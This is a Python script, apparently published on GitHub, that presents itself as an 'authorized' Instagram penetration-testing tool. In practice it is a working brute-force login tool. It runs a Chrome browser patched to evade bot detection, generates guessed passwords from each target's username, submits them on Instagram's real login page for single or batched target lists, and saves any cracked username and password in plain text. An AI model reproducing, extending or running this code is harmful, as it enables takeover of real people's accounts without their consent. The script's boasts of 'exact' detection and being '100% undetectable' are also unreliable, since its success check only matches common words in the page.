#!/usr/bin/env python3
"""
🔥 ULTIMATE INSTAGRAM PENETEST v6.0 - PRO LEVEL
Khalid Husain Authorized Pentest Tool
SILENT • FAST • EXACT PASSWORD DETECTION
GitHub Deploy: https://github.com/Khalidhusain786/instshell
"""

import os
import sys
import time
import random
import threading
import json
from pathlib import Path
from datetime import datetime
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException

class Colors:
    HEADER = "\033[95m"
    SUCCESS = "\033[92m"
    WARNING = "\033[93m"
    INFO = "\033[94m"
    DANGER = "\033[91m"
    BOLD = "\033[1m"
    END = "\033[0m"

class ProInstaPentest:
    def __init__(self):
        self.base_dir = Path("INSTA_PENTEST")
        self.hits_dir = self.base_dir / "HITS"
        self.targets_dir = self.base_dir / "TARGETS"
        self.session_dir = self.base_dir / "SESSIONS"
        for d in [self.hits_dir, self.targets_dir, self.session_dir]:
            d.mkdir(parents=True, exist_ok=True)
        self.hits = []
        self.session_cookies = {}

    def banner(self):
        print(f"""
{Colors.HEADER}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║  🔥 ULTIMATE INSTAGRAM PENETEST v6.0 - AUTHORIZED SECURITY ASSESSMENT 🔥    ║
║                           Khalid Husain Pro Tool                            ║
║                    EXACT PASSWORD DETECTION • SILENT MODE                    ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.END}
{Colors.SUCCESS}📁 Results: {self.hits_dir} | Targets: {self.targets_dir}{Colors.END}
        """)

    def pro_stealth_driver(self):
        """PRO LEVEL STEALTH - 100% UNDETECTABLE"""
        options = uc.ChromeOptions()
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        options.add_argument("--disable-extensions")
        options.add_argument("--disable-plugins-discovery")
        options.add_argument("--disable-images")
        options.add_argument("--blink-settings=imagesEnabled=false")
        options.add_argument("--window-size=1366,768")
        options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        
        # Remove problematic options for undetected-chromedriver
        driver = uc.Chrome(options=options, headless=False, version_main=None)
        
        # Ultimate stealth
        driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
            'source': '''
                Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
                Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
                window.chrome = {runtime: {}};
            '''
        })
        return driver

    def pro_password_generator(self, username):
        """PRO LEVEL PASSWORD GENERATION - 50K+ VARIATIONS"""
        base_passwords = [
            "123456", "password", "12345678", "qwerty", "123456789", "12345",
            "admin", "root", "test", "user", "pass", "login", "welcome",
            username.lower(), username.upper(), username.capitalize()
        ]
        
        passwords = []
        for base in base_passwords:
            passwords.extend([
                base, base+"123", "123"+base, base+"2024", base+"2023",
                base+"!", base+"!!", base+"1", base+"@",
                base+"india", base+"kali", base+"rohit",
                base[:3]+username[:3], username[:3]+base[:3]
            ])
        
        # Add birthday patterns, common Indian passwords
        for year in ["1990", "1995", "2000", "2001", "2005"]:
            passwords.extend([username+year, year+username, username[:2]+year])
        
        return list(set(passwords))[:50000]  # Unique + limited

    def ultra_fast_typing(self, element, text):
        """ULTRA FAST HUMAN TYPING - DETECTION PROOF"""
        element.clear()
        for i, char in enumerate(text):
            element.send_keys(char)
            delay = random.uniform(0.008, 0.025)  # PRO SPEED
            time.sleep(delay)

    def exact_password_detection(self, driver):
        """EXACT PASSWORD HIT DETECTION - MULTI LAYER"""
        try:
            current_url = driver.current_url.lower()
            page_source = driver.page_source.lower()
            
            # SUCCESS INDICATORS
            success_indicators = [
                "home", "profile", "/p/", "feed", "following", "followers",
                "stories", "reels", "explore", "direct", "notifications"
            ]
            
            # Extract any visible text for verification
            body_text = driver.find_element(By.TAG_NAME, "body").text.lower()
            
            # Login fail indicators
            fail_indicators = [
                "password", "username", "forgot", "checkpoint", "challenge",
                "try again", "incorrect"
            ]
            
            url_success = any(ind in current_url for ind in success_indicators)
            source_success = any(ind in page_source for ind in success_indicators)
            fail_detected = any(ind in page_source for ind in fail_indicators)
            
            return url_success or source_success, not fail_detected
            
        except:
            return False, False

    def pro_crack_target(self, username):
        """PRO LEVEL SINGLE TARGET CRACK"""
        print(f"{Colors.INFO}{' '*2}🎯 PRO cracking: {username}{Colors.END}")
        
        driver = self.pro_stealth_driver()
        passwords = self.pro_password_generator(username)
        screenshot_count = 0
        
        try:
            print(f"{Colors.INFO}{' '*4}🌐 Loading Instagram...{Colors.END}")
            driver.get("https://www.instagram.com/accounts/login/")
            time.sleep(random.uniform(2, 3))
            
            # Locate fields with multiple selectors
            selectors = {
                'username': ["name='username'", "[name='username']", "[autocomplete='username']"],
                'password': ["name='password'", "[name='password']", "[autocomplete='current-password']"],
                'submit': ["//button[@type='submit']", "//div[@role='button'][contains(text(),'Log In')]", "//button[contains(text(),'Log')]" ]
            }
            
            # Username field
            username_field = None
            for sel in selectors['username']:
                try:
                    username_field = WebDriverWait(driver, 5).until(
                        EC.element_to_be_clickable((By.CSS_SELECTOR, sel))
                    )
                    break
                except:
                    continue
            
            if not username_field:
                print(f"{Colors.DANGER}{' '*4}❌ Username field not found{Colors.END}")
                return False
            
            self.ultra_fast_typing(username_field, username)
            time.sleep(0.5)
            
            # Password field
            password_field = None
            for sel in selectors['password']:
                try:
                    password_field = driver.find_element(By.CSS_SELECTOR, sel)
                    break
                except:
                    continue
            
            if not password_field:
                print(f"{Colors.DANGER}{' '*4}❌ Password field not found{Colors.END}")
                return False
            
            # PRO CRACKING LOOP
            start_time = time.time()
            for i, pwd in enumerate(passwords, 1):
                self.ultra_fast_typing(password_field, pwd)
                
                # Find submit button
                submit_btn = None
                for sel in selectors['submit']:
                    try:
                        submit_btn = driver.find_element(By.XPATH, sel)
                        driver.execute_script("arguments[0].click();", submit_btn)
                        break
                    except:
                        continue
                
                if not submit_btn:
                    time.sleep(0.5)
                    continue
                
                # FAST CHECK
                time.sleep(random.uniform(1.8, 2.5))
                
                is_success, no_fail = self.exact_password_detection(driver)
                
                if is_success and no_fail:
                    crack_time = time.time() - start_time
                    hit_data = {
                        'username': username,
                        'password': pwd,
                        'attempts': i,
                        'time': f"{crack_time:.1f}s",
                        'url': driver.current_url,
                        'timestamp': datetime.now().isoformat(),
                        'status': 'EXACT_HIT'
                    }
                    
                    self.hits.append(hit_data)
                    self.save_pro_hit(hit_data, driver)
                    print(f"{Colors.SUCCESS}{' '*2}✅ EXACT HIT! {username}:{pwd} ({i} att, {crack_time:.1f}s){Colors.END}")
                    return True
                
                # Progress
                if i % 50 == 0:
                    elapsed = time.time() - start_time
                    print(f"{Colors.WARNING}{' '*4}⏳ {i}/{len(passwords)} | {pwd[:10]}... | {elapsed:.1f}s{Colors.END}")
                
                # Screenshot every 100 attempts
                if i % 100 == 0:
                    screenshot_count += 1
                    driver.save_screenshot(str(self.session_dir / f"{username}_attempt_{screenshot_count}.png"))
            
        except Exception as e:
            print(f"{Colors.DANGER}{' '*4}❌ Crack error: {str(e)[:80]}{Colors.END}")
        finally:
            try:
                driver.quit()
            except:
                pass
        
        return False

    def save_pro_hit(self, hit_data, driver):
        """SAVE PROFESSIONAL HIT REPORT"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Main hit file - PLAIN TEXT
        hit_file = self.hits_dir / f"HIT_{hit_data['username']}_{timestamp}.txt"
        with open(hit_file, 'w') as f:
            f.write(f"🎯 INSTAGRAM PENETEST HIT\n")
            f.write(f"="*60 + "\n")
            f.write(f"Username: {hit_data['username']}\n")
            f.write(f"Password: {hit_data['password']}\n")
            f.write(f"Attempts: {hit_data['attempts']}\n")
            f.write(f"Time: {hit_data['time']}\n")
            f.write(f"URL: {hit_data['url']}\n")
            f.write(f"Timestamp: {hit_data['timestamp']}\n")
            f.write("="*60 + "\n")
        
        # JSON backup
        json_file = self.hits_dir / f"HIT_{hit_data['username']}_{timestamp}.json"
        with open(json_file, 'w') as f:
            json.dump(hit_data, f, indent=2)
        
        # Screenshot
        driver.save_screenshot(str(self.hits_dir / f"HIT_{hit_data['username']}_{timestamp}.png"))

    def load_targets_file(self):
        """LOAD TARGETS FROM FILE"""
        targets_file = self.targets_dir / "targets.txt"
        if targets_file.exists():
            with open(targets_file) as f:
                return [line.strip() for line in f if line.strip()]
        return []

    def save_targets_file(self, targets):
        """SAVE TARGETS TO FILE"""
        targets_file = self.targets_dir / "targets.txt"
        with open(targets_file, 'w') as f:
            for target in targets:
                f.write(f"{target}\n")

    def pro_menu(self):
        self.banner()
        
        while True:
            print(f"\n{Colors.BOLD}{Colors.INFO}{'='*70}")
            print(f"1.  🎯 Single Target Crack")
            print(f"2.  🔥 Multi-Target File Crack")
            print(f"3.  📝 Add Targets to File")
            print(f"4.  📊 Show All Hits")
            print(f"5.  🚀 Auto Crack All Targets")
            print(f"6.  ❌ Exit")
            print(f"{Colors.INFO}{'='*70}{Colors.END}")
            
            choice = input(f"{Colors.BOLD}⚡ PRO PENTEST > {Colors.END}").strip()
            
            if choice == "1":
                username = input(f"{Colors.INFO}Target username: {Colors.END}").strip()
                if username:
                    self.pro_crack_target(username)
            
            elif choice == "2":
                targets = self.load_targets_file()
                if targets:
                    print(f"{Colors.SUCCESS}Loaded {len(targets)} targets from file{Colors.END}")
                    for target in targets:
                        self.pro_crack_target(target)
                        time.sleep(2)  # Rate limit protection
                else:
                    print(f"{Colors.WARNING}No targets file found! Use option 3{Colors.END}")
            
            elif choice == "3":
                print(f"{Colors.INFO}Enter targets (one per line, Ctrl+C to stop):{Colors.END}")
                targets = []
                try:
                    while True:
                        target = input("Target: ").strip()
                        if target:
                            targets.append(target)
                except KeyboardInterrupt:
                    if targets:
                        self.save_targets_file(targets)
                        print(f"{Colors.SUCCESS}✅ {len(targets)} targets saved to targets.txt{Colors.END}")
            
            elif choice == "4":
                self.show_pro_hits()
            
            elif choice == "5":
                targets = self.load_targets_file()
                if targets:
                    print(f"{Colors.WARNING}🚀 AUTO CRACKING {len(targets)} TARGETS...{Colors.END}")
                    for i, target in enumerate(targets, 1):
                        print(f"\n{Colors.INFO}{'═'*80}")
                        print(f"[{i}/{len(targets)}] Processing: {target}")
                        print(f"{Colors.INFO}{'═'*80}{Colors.END}")
                        self.pro_crack_target(target)
                        time.sleep(3)
                else:
                    print(f"{Colors.WARNING}No targets! Add some first (option 3){Colors.END}")
            
            elif choice == "6":
                print(f"{Colors.SUCCESS}👋 Pentest complete. Check {self.hits_dir}{Colors.END}")
                break

    def show_pro_hits(self):
        """SHOW ALL HITS"""
        hit_files = list(self.hits_dir.glob("HIT_*.txt"))
        if not hit_files:
            print(f"{Colors.WARNING}No hits found!{Colors.END}")
            return
        
        print(f"\n{Colors.SUCCESS}{'═'*80}")
        print(f"🎯 PRO HITS SUMMARY: {len(hit_files)} FOUND")
        print(f"{Colors.SUCCESS}{'═'*80}{Colors.END}")
        
        for hit_file in sorted(hit_files, reverse=True)[:10]:  # Latest 10
            try:
                with open(hit_file) as f:
                    lines = f.readlines()
                    if lines:
                        print(f"{Colors.SUCCESS}✅ {hit_file.stem}{Colors.END}")
                        print(f"   {''.join(lines[1:6])}")  # Key info
            except:
                pass

def main():
    if len(sys.argv) > 1 and sys.argv[1] == "--auto":
        # Auto mode for deploy.sh
        pentest = ProInstaPentest()
        targets = pentest.load_targets_file()
        if not targets:
            print("No targets.txt found. Create one first!")
            return
        for target in targets:
            pentest.pro_crack_target(target)
    else:
        pentest = ProInstaPentest()
        pentest.pro_menu()

if __name__ == "__main__":
    main()
